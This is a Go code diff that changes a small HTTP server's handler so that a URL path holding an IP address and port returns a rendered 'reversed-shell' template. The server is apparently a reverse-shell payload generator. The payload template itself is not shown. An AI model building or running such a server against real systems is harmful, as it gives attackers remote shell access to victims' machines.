@@ -4,23 +4,11 @@ package shell
 import (
 	"fmt"
 	"net/http"
-	_ "embed"
+	"text/template"
 
 	"github.com/cmj0121/logger"
 	"github.com/cmj0121/argparse"
 )
-
-// the project information
-const (
-	PROJ_NAME = "shell"
-
-	MAJOR = 0
-	MINOR = 0
-	MACRO = 0
-)
-// the Shell template
-//go:embed assets/welcome
-var Welcome string
 
 func Version() (ver string) {
 	ver = fmt.Sprintf("%v (v%d.%d.%d)", PROJ_NAME, MAJOR, MINOR, MACRO)
@@ -66,8 +54,35 @@ func (shell *Shell) Run() {
 func (shell *Shell) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	shell.Logger.Info("serve %-22s [%s] %s",r.RemoteAddr, r.Method, r.URL)
 
-
+	// always set the header as text/plain
 	w.Header().Add("Content-Type", "text/plain")
-	w.Write([]byte(Welcome))
+
+	// the query PATH
+	path := r.URL.EscapedPath()
+	shell.Logger.Debug("process the PATH: %#v", path)
+	switch {
+	case RE_REVERSED_SHELL.MatchString(path):
+		ip := "127.0.0.1"
+		port := "8888"
+
+		matched := RE_REVERSED_SHELL.FindStringSubmatch(path)
+		if matched[1] != "" {
+			ip = matched[1]
+		}
+		if matched[2] != "" {
+			port = matched[2]
+		}
+
+		tmpl := template.Must(template.New("reversed-shell").Parse(TMPL_ReversedShell))
+		tmpl.Execute(w, struct {
+			IP string
+			PORT string
+		} {
+			IP: ip,
+			PORT: port,
+		})
+	default:
+		w.Write([]byte(TMPL_Welcome))
+	}
 }
 
